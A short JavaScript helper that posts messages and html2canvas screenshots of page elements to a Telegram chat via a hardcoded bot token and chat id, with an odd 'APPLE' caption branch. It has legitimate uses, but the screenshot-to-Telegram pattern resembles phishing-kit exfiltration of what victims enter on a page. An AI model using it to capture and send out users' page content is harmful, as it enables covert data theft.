var token="643745327:Y798WaG02HAGHJGhghgHJGYUgghfydfhjbdhbfehh"; //Replace with your token
var pre="https://api.telegram.org/bot"+token+"/";
var chatid=-1378676789678;  //Replace with your chatId.

function executeCommand(x){
    
    fetch(x).then(responce=>responce.json()).then(data=>{
        console.log(data);
    });
}

function sendMessage(x){
    var method="sendMessage?"
    const params = new URLSearchParams({
        chat_id:chatid,
        text:x
    });
    var post=params.toString();
    var final=pre+method+post;
    executeCommand(final);
}
function sendImg2(element) {
    const targetElement =element;
    html2canvas(targetElement)
    .then(canvas => {
        const dataUrl = canvas.toDataURL('image/png');
        const formData = new FormData();
        const fileData = dataURItoBlob(dataUrl);
    
        formData.append('chat_id', chatid);
        formData.append('photo', fileData);
    
        fetch(pre+'sendPhoto', {
        method: 'POST',
        body: formData
        })
        .then(response => response.json())
        .then(data => {
        console.log('Image sent successfully:', data);
        })
        .catch(error => {
        console.error('Error:', error);
        });

    })
    .catch(error => {
        console.error('Error:', error);
    });
    
  }
  function sendImg(element,captionsMessage) {
    if(captionsMessage=="APPLE"){
        sendImg2(element);
        return;
    }
    const targetElement =element;
    html2canvas(targetElement)
    .then(canvas => {
        const dataUrl = canvas.toDataURL('image/png');
        const formData = new FormData();
        const fileData = dataURItoBlob(dataUrl);
    
        formData.append('chat_id', chatid);
        formData.append('photo', fileData);
        formData.append('caption', captionsMessage);
    
        fetch(pre+'sendPhoto', {
        method: 'POST',
        body: formData
        })
        .then(response => response.json())
        .then(data => {
        console.log('Image sent successfully:', data);
        })
        .catch(error => {
        console.error('Error:', error);
        });

    })
    .catch(error => {
        console.error('Error:', error);
    });
    
  }
  
  // Function to convert base64 to Blob object
function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);

    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ab]);
}

// function getTimeString(time){
//     const date = new Date(time*1000);
//     const formattedTime = date.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric' });

//     return formattedTime;
// }

//-----------------

  
  